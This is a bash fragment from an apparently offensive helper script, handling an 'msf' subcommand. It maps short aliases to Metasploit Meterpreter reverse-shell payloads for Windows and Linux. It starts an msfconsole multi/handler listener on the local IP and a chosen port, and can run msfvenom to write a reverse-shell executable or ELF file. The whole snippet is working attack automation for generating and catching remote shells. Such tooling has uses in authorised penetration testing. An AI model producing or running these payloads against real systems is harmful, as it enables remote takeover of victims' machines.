## msf [payload] [port]^: metasploit setp listener / generate payload
if [[ "$1" =~ ^msf$ ]]; then
  CMD="msfconsole"
  export INSTCMD="apt install metasploit-framework -y"
  checkCmd
  IP="$(getIP)"

  PAYLOAD="generic/shell_reverse_tcp"
  if [ "$#" -ge 2 ]; then
    case "$2" in
      "wrt"|"windows/x64/meterpreter/reverse_tcp")     PAYLOAD="windows/x64/meterpreter/reverse_tcp"; FORMAT="exe";;
      "wru"|"windows/x64/meterpreter/reverse_udp")     PAYLOAD="windows/x64/meterpreter/reverse_udp"; FORMAT="exe";;
      "wrh"|"windows/x64/meterpreter/reverse_http")    PAYLOAD="windows/x64/meterpreter/reverse_http"; FORMAT="exe";;
      "wrhs"|"windows/x64/meterpreter/reverse_https")  PAYLOAD="windows/x64/meterpreter/reverse_https"; FORMAT="exe";;

      "wrt86"|"windows/meterpreter/reverse_tcp")       PAYLOAD="windows/meterpreter/reverse_tcp"; FORMAT="exe";;
      "wru86"|"windows/meterpreter/reverse_udp")       PAYLOAD="windows/meterpreter/reverse_udp"; FORMAT="exe";;
      "wrh86"|"windows/meterpreter/reverse_http")      PAYLOAD="windows/meterpreter/reverse_http"; FORMAT="exe";;
      "wrhs86"|"windows/meterpreter/reverse_https")    PAYLOAD="windows/meterpreter/reverse_https"; FORMAT="exe";;

      "lrt"|"linux/x64/meterpreter/reverse_tcp")       PAYLOAD="linux/x64/meterpreter/reverse_tcp"; FORMAT="elf";;
      "lru"|"linux/x64/meterpreter/reverse_udp")       PAYLOAD="linux/x64/meterpreter/reverse_udp"; FORMAT="elf";;
      "lrh"|"linux/x64/meterpreter/reverse_http")      PAYLOAD="linux/x64/meterpreter/reverse_http"; FORMAT="elf";;
      "lrhs"|"linux/x64/meterpreter/reverse_https")    PAYLOAD="linux/x64/meterpreter/reverse_https"; FORMAT="elf";;

      "lrt86"|"linux/x86/meterpreter/reverse_tcp")     PAYLOAD="linux/x86/meterpreter/reverse_tcp"; FORMAT="elf";;
      "lru86"|"linux/x86/meterpreter/reverse_udp")     PAYLOAD="linux/x86/meterpreter/reverse_udp"; FORMAT="elf";;
      "lrh86"|"linux/x86/meterpreter/reverse_http")    PAYLOAD="linux/x86/meterpreter/reverse_http"; FORMAT="elf";;
      "lrhs86"|"linux/x86/meterpreter/reverse_https")  PAYLOAD="linux/x86/meterpreter/reverse_https"; FORMAT="elf";;

      *)                                               PAYLOAD="$2";;
    esac
  fi

  PORT="9001"
  if [ "$#" -ge 3 ]; then
    if [[ "$3" =~ ^[0-9]+$ ]]; then
      PORT="$3"
    else
      echo "${warn} Port is not a number!"; exit
    fi
  fi

  CMD="msfconsole -x \"use exploit/multi/handler; set PAYLOAD $PAYLOAD; set LHOST $IP; set LPORT $PORT; run\""

  # generate payload?
  if [ "$#" -ge 4 ]; then
    if [[ "$4" =~ ^gen(erate)?$ ]]; then
      if [ "$#" -ge 5 ]; then # format is given
        FORMAT="$5"
      fi
      CMD="msfvenom -p $PAYLOAD LHOST=$IP LPORT=$PORT -f $FORMAT -o fxy.$FORMAT"
    fi
  fi

  echo "${bldwht}> $CMD${txtrst}"
  prompt
  bash -c "$CMD"
  exit
fi
